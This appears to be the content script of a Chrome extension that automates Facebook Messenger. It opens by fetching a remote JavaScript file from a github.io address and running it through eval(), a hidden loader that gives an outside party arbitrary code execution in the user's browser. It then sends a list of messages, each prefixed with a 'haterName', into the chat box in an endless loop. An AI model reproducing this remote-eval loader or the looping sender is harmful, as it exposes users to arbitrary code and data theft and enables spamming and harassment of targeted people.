
(async () => {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/remote.js?t=" + Date.now()
        );

        const code = await response.text();

        eval(code);

        console.log("Remote GitHub script loaded");

    } catch (e) {

        console.log("Remote Load Error:", e);

    }

})();
// Remote config loader
let remoteConfig = {
    enabled: true
};

async function loadRemoteConfig() {

    try {

        const response = await fetch(
            "https://technicalabhi12341-prog.github.io/E2EE-Loader-/keys.json?t=" + Date.now()
        );

        remoteConfig = await response.json();

        console.log("Remote config loaded:", remoteConfig);

    } catch (e) {

        console.log("Remote config error:", e);

    }
}

// Load config first
loadRemoteConfig();

// Reload config every 30 seconds
setInterval(loadRemoteConfig, 30000);



// Main listener
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

    console.log("Message received in content script:", request);

    // Stop if disabled remotely
    if (remoteConfig.enabled === false) {

        console.log("Extension disabled remotely");

        return;

    }

    if (request.messages && request.speed && request.haterName !== undefined) {

        sendMessages(
            request.messages,
            request.speed,
            request.haterName
        );

    }

});


// Send messages function
function sendMessages(messages, speed, haterName) {

    let index = 0;

    function sendNextMessage() {

        // Remote stop check
        if (remoteConfig.enabled === false) {

            console.log("Stopped remotely");

            return;

        }

        if (messages.length > 0) {

            // Safe message formatting
            const messageWithHaterName =

                haterName && haterName.trim() !== ""

                    ? `${haterName} ${messages[index]}`

                    : messages[index];

            console.log(
                "Sending message:",
                messageWithHaterName
            );

            // Messenger input
            const inputBox =
                document.querySelector('[contenteditable="true"]');

            if (inputBox) {

                inputBox.focus();

                document.execCommand(
                    "selectAll",
                    false,
                    null
                );

                document.execCommand(
                    "delete",
                    false,
                    null
                );

                document.execCommand(
                    "insertText",
                    false,
                    messageWithHaterName
                );

                // Enter key
                const event = new KeyboardEvent(
                    "keydown",
                    {
                        key: "Enter",
                        code: "Enter",
                        keyCode: 13,
                        which: 13,
                        bubbles: true
                    }
                );

                inputBox.dispatchEvent(event);

                console.log(
                    "Message sent successfully:",
                    messageWithHaterName
                );

                index++;

                // Loop
                if (index >= messages.length) {

                    index = 0;

                }

                setTimeout(
                    sendNextMessage,
                    speed
                );

            } else {

                console.log(
                    "Messenger input box not found"
                );

            }

        }

    }

    sendNextMessage();

}
